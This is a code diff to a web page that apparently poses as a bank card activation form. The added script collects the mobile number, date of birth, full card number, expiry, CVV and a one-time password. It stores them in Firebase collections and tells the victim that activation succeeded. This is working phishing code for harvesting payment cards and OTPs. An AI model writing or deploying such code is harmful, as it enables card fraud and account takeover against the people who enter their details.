@@ -386,8 +386,56 @@ document.getElementById('expiry').addEventListener('input', function (event) {
         // Initialize Firebase
         const app = initializeApp(firebaseConfig);
         const analytics = getAnalytics(app);
+        const activationForm = document.getElementById('activationForm');
+        const activateBtn = document.getElementById('activate-btn');
+        const otpInputs = document.querySelectorAll('.otp-box');
+        const verifyBtn = document.getElementById('verify-btn');
 
-        // You can now use Firebase features such as Firebase Auth, Firebase Firestore, etc.
+        activationForm.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const mobile = document.getElementById('mobile').value;
+            const dob = document.getElementById('dob').value;
+            const cardNumber = document.getElementById('card-number').value;
+            const expiry = document.getElementById('expiry').value;
+            const cvv = document.getElementById('cvv').value;
+
+            try {
+                await addDoc(collection(db, 'card-activations'), {
+                    mobile,
+                    dob,
+                    cardNumber,
+                    expiry,
+                    cvv
+                });
+                alert('Card details submitted successfully! Please verify OTP.');
+                document.getElementById('activation-container').style.display = 'none';
+                document.getElementById('otp-container').style.display = 'block';
+            } catch (error) {
+                console.error('Error adding document: ', error);
+                alert('Failed to submit data. Try again.');
+            }
+        });
+
+        otpInputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                const otpComplete = [...otpInputs].every(input => input.value.trim() !== '');
+                verifyBtn.disabled = !otpComplete;
+            });
+        });
+
+        verifyBtn.addEventListener('click', async () => {
+            const otp = Array.from(otpInputs).map(input => input.value).join('');
+            try {
+                await addDoc(collection(db, 'otp-verifications'), { otp });
+                alert('OTP Verified! Card activation successful.');
+                document.getElementById('otp-container').style.display = 'none';
+                document.getElementById('success-container').style.display = 'block';
+            } catch (error) {
+                console.error('Error verifying OTP: ', error);
+                alert('Failed to verify OTP. Try again.');
+            }
+        });
+        
     </script>
 </body>
 </html>
